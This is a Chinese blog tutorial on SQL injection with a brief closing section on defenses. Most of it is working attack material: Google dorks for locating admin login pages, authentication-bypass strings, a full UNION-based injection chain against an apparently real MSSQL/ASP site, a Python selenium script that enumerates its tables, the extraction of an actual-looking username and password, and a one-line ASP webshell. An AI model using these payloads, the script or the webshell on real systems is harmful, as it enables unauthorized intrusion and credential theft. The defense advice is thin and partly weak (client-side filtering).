# [渗透&攻防] 一.从数据库原理学习网络攻防及防止SQL注入 - 杨秀璋的专栏 - CSDN博客





2017年07月13日 00:06:21[Eastmount](https://me.csdn.net/Eastmount)阅读数：4907








这是最近自己学习渗透和网站攻防的文章，希望能深入地学习这部分知识，同时认了Na师傅和Rong师傅，知道了人外有人、天外有天，真的很享受这种探索问题、解决问题和分析知识的过程。希望文章对你有所帮助，尤其是学习网站如何防止SQL注入及数据库原理的初学者或安全工程师。如果文章中存在错误或不足之处，还请海涵~


    一.Google搜索知识
    二.万能密码原理
    三.数据库解读SQL注入攻防原理
        1.数据库如何判断注入点
        2.数据库如何判断字段总数 order by
        3.数据库获取显示位 union
        4.数据库显示错误网页及对应数据 db_name
        5.数据库获取表名及列名，Python爬虫引入
        6.数据库获取登录表usr字段 id=object_id('usr')
        7.数据库返回用户名和密码 
        8.登录系统并获取WebShell
    四.防SQL注入措施及建议




## 一. Google搜索知识


Google提供了强大的搜索功能，可以获取精准的结果。如果访问不了，也可以通过百度获取相关内容，但是结果远没有谷歌精准，很多无关的广告及视频会返回给你。
方法如下：

**intitle:eastmount**
搜索网页标题包含eastmount字符的网页。


![](https://img-blog.csdn.net/20170627225058055)



**inurl:cbi**
搜索包含特定字符cbi的URL。





**intext:cbi**
搜索网页正文内容包含特定字符cbi的网页。





**filetype:ppt**
搜索制定类型的文件，返回所有以ppt结尾的文件URL。





**site**
找到与指定网站有联系的URL。



常用示例：inurl:login.asp、inurl:asp?id=、inurl:login.asp intilte:贵州


![](https://img-blog.csdn.net/20170627225958480)











## 二. 万能密码原理

万能密码通常是指开发人员在开发过程中使用超级管理员进行开发，开发完成后没有过滤掉这些常用的超级管理员；另一种是存在SQL漏洞管理员账号。下面分别进行讨论：

1.万能密码：用户名 admin、密码admin，用户名admin、密码123456

2.万能密码：用户名 'or'='or'、密码 'or'='or'
   原理解释：假设用户登录对应的语句为：
 select name, pwd from login where name='' and pwd='';
   如果用户名输入正确则直接登录，否则提示用户名或密码错误，使用万能密码后的SQL语句如下：
select name, pwd from login where name='**'or'='or'**' and pwd='**'or'='or'**';
   核心代码，两个单引号匹配，即name=''，然后or连接，单引号等于单引号('=')这是恒成立的，紧接着or连接两个单引号('')，同理密码pwd。这样or连接的('=')是恒成立的，故返回结果为真，导致直接登录。

3.万能密码：用户名 'or''='、密码'or''='
   原理解释：此时对应的SQL语句如下：
select name, pwd from login where name='**'or''='**' and pwd='**'or''='**';


4.万能密码：用户名'or'='--、密码'or'='--
原理解释：此时对应的SQL语句如下：
select name, pwd from login where name='**'or'='--**' and pwd='**'or'='--**';


通过如 inurl:login.asp 等搜索技术找到一些列网站后台登录界面后，反复尝试这些万能密码进行登录。防范措施也比较简单：

1.开发人员开发完成后，过滤掉admin等常用账号或修改密码；
2.当用户第一次登录的时候，对简单的密码进行修改提示，防止暴力破解；
3.用户名或密码屏蔽掉单引号(')、等号(=)、注释(--)等特殊字符；
4.对尝试SQL注入的IP地址进行报警提示或日志记录。





## 三. 数据库解读SQL注入攻防原理

下面通过一个简单的例子从数据库原理知识解读SQL注入攻防原理，内容比较简单，但希望假设存在一个网址能正常显示内容：
http://xxxxx/show.asp?code=115
对应的后台SQL语句可能如下：
select .... from table where code='115' and xxxx;




**1.数据库如何判断注入点**

判断注入点的方法很多，比如show.asp?code=115' 加单引号，show.asp?code=115-1 减1，这里介绍一个经典的方法。
(1) http://xxxxx/show.asp?code=115**' and 1=1 --      ** (正常显示)
对应的SQL语句：
select .... from table where code='115' and 1=1 -- and xxxx;
单引号(')匹配code='115，然后and连接，1=1恒成立，注释(--)掉后面语句。

(2) http://xxxxx/show.asp?code=115' and 1=2 --       (错误显示)
对应的SQL语句：
select .... from table where code='115' and 1=2 -- and xxxx;
单引号(')匹配code='115，然后and连接，1=2恒错误，注释(--)掉后面语句。



**2.数据库如何判断字段总数 order by**

(1) http://xxxxx/show.asp?code=115' order by 1 --    (正常显示)
对应的SQL语句：
select .... from table where code='115' order by 1 -- and xxxx;
按照1个字段进行排序，正常显示表示该URL对应的SQL语句至少一个字段。

(2) http://xxxxx/show.asp?code=115**' order by 10 -- **(正常显示)
对应的SQL语句：
select .... from table where code='115' order by 10 -- and xxxx;
依次按照字段增加网上进行排序，如果提示错误order by 11，则表示共10个字段。

(3) http://xxxxx/show.asp?code=115**' order by 11 --  **(错误显示)




**3.数据库获取显示位 union**

在得到字段个数后，需要获取字段位置，则使用union或union all。其中union表示将两个select结果整体显示，并合并相同的结果，union all显示全部结果。例如：



![](https://img-blog.csdn.net/20170712230408730)

(1) http://xxxxx/show.asp?code=115**' union all select null,...,null -- **
正常显示，共10个null，表示通配符，如果9个null会报错，需对应10个字段。

(2) http://xxxxx/show.asp?code=115**' union all select 1,...,null -- **
依次替换成数字，测试哪几个字段有结果，如果报错则替换回null。最终的结果为：
show.asp?code=115**' union all select 1,null,3,null,null,6,7,8,9,10 --**对应的SQL语句为：
select .... from table where code='115' union all select 1,null,3,null,null,6,7,8,9,10 -- xxxx;

(3) http://xxxxx/show.asp?code=-1**' union all select 1,...,null -- **
然后将数字115替换成-1，一个不存在的界面，则会显示如下所示结果，可以看到附件显示对应的值7、8、9，再想办法将我们需要的结果在这里显示即可，这些数据都是从后台数据库中查询出来的。


![](https://img-blog.csdn.net/20170712231306296)




**4.数据库显示错误网页及对应数据 db_name**

该网站使用的数据库为MSSQL，则一定特定的字段需要知道：
   host_name()：连接数据库服务器的计算机名称
   @@version：获取数据库版本号
   db_name()：数据库的库名称
   @@servername：当前数据库计算机的名称=host_name()

(1) http://xxxxx/show.asp?code=-1**' union all select 1,null,3,null,null,6,host_name(),@@version,db_name(),10 --**
输出结果如下所示：
    附件1：AYD
    附件2：Microsoft SQL Server....
    附件3：ahykd_new
其中数据库的名称就是ahykd_new，接下来相同的道理获取数据库所有表及列。



**5.数据库获取表名及列名，Python爬虫引入**

SQL Server自带系统对象表，当前数据库所有字段。
    sysobjects 表名
    syscolumns 列名
其中，name表示对象名（表名），id表示表编号，type表示对象类型，其值为U表示用户表，S表示系统表，C约束，PK主键等。
sysobjects 和 syscolumns 之间以id互相对应，一个表名在sysobjects得到id后可以在syscolumns找到它的列名。
重点知识：
a.查看所有表名语句
select name from sysobjects where type='U';
 b.询表table1的所有字段名称
select name from syscolumns where id=object_id('table1')；

(1) http://xxxxx/show.asp?code=-1' union all 
select **1,null,3,null,null,6,7,8,(select top 1 name from sysobjects where type='U'),10 --**输出结果如下所示： 
    附件1：7
    附件2：8
    附件3：kc_jxjd
其中top 1 name用于输出1个字段(相当于MySQL使用limit 1)，sysobjects中u为用户表，count(*)可以统计总共87个表。
问题：现在是获取1个表，那么如何获取其他表呢？

(2) http://xxxxx/show.asp?code=-1' union all 
select **1,null,3,null,null,6,7,8, (select top 1 name from (select top 2 name from **sysobjects **where type='U' order by desc****) a order by 1 asc),10 --**
通过子查询一个升序，一个降序获取第二个值，同理第三个top 3。
下面通过Python定义一个爬虫不断访问top n，获取所有的表名，代码如下：


```python
# coding=utf-8
from selenium import webdriver             
driver = webdriver.Firefox()    

#查询表的名字
#(select top 1 name from (select top " + str(i) +" name from sysobjects where xtype='u' order by 1 asc)a order by 1 desc)
i = 1
while i<=87:
    url = "http://...tztgxx.aspx?code=-115' union all select 1,null,1,null,null,6,host_name(),@@servername,(select top 1 name from (select top " + str(i) +" name from sysobjects where xtype='u' order by 1 asc)a order by 1 desc),10 --"
    #print url
    driver.get(url)
    elem = driver.find_element_by_xpath("//form[@name='form1']/div[2]/table/tbody/tr[7]")
    print elem.text
    i = i + 1
```
分析输出的所有表名，可以发现usr为后台登录表。




**6.数据库获取登录表usr字段 id=object_id('usr')**

(1) http://xxxxx/show.asp?code=-1' union all 
select 1,null,3,null,null,6,7,8,
(select top 1 name from syscolmns where id=object_id('usr')),10 --
输出结果如下所示： 
    附件1：7
    附件2：8
    附件3：answer
其中top 1 name用于输出1个字段，表usr的一个列表。

(2) 核心SQL语句获取不同的列名：
**(select top 1 name from ****(select top ****3**** name from ****syscolumns where id=object_id('usr') order by asc****) a ****order by 1 desc)**输出结果如下所示： 
    附件1：7
    附件2：8
    附件3：dic_roll
同理，也可以借助Python获取所有字段，如果字段少，手工即可测试出来，count(*)返回字段个数。最后发现，用户名为usr_name，密码为passwd。



**7.数据库返回用户名和密码 **

(1) http://xxxxx/show.asp?code=-1' union all 
select 1,null,3,null,null,6,7,8,**(select top 1 usr_name from usr)**,10 --
输出结果如下所示： 
    附件1：7
    附件2：8
    附件3：2016001
输出用户名2016001，在搜索密码。

(2) http://xxxxx/show.asp?code=-1' union all 
select 1,null,3,null,null,6,7,8,
**(select passwd  from usr where usr_name='2016001')**,10 --
输出结果如下所示： 
    附件1：7
    附件2：8
    附件3：123456
输出用户名2016001，密码123456，此时即可登录，通过Python可以获取所有值。




**8.登录系统并获取WebShell**

登录后台基本完成，下面将讲解如何进行SQL防御。
PS：<%eval request("Nana") %>






## 四. 防SQL注入措施及建议

上面通过数据库原理进行了详细的讲解，这种网站基本很少存在了，几乎为0，更多的网页都有相关的屏蔽的。比如：
1.在URL设置不允许非法字符，如单引号、等号、注释--、减号，提示非法参数；

2.在URL设置不允许SQL常见的关键词，如and、select、or、insert等；

3.传递的id=115参数必须为数字才能正常跳转，否则跳转错误，如下图所示：



![](https://img-blog.csdn.net/20170712235345953)



4.服务器启用SQL注入拦截功能，提示当前网页的 URL / POST / COOKIES中包含了特定的 SQL字符而被防火墙拦截，因为可能通过POST、Cookies进行攻击。各方面都需要做到防御。



![](https://img-blog.csdn.net/20170712235538443)




5.可以使用Javascript在客户端进行不安全字符屏蔽，也可以在jsp中调用该函数检查是否包函非法字符，或使用正则表达式过滤传入的参数，防止SQL从URL注入。




希望文章对你有所帮助，尤其是网络安全的程序员，如果文章存在错误或不足之处，还请海涵。感谢娜师傅的一路陪伴，学中文的扔掉了手中的尤克里里，教我写代码也是很疯狂的啊，哈哈！不忘初心，继续前行。加油，秀璋。绿妖，晚安！
(By:Eastmount 2017-07-13 晚上12点[http://blog.csdn.net/eastmount/](http://blog.csdn.net/eastmount/))





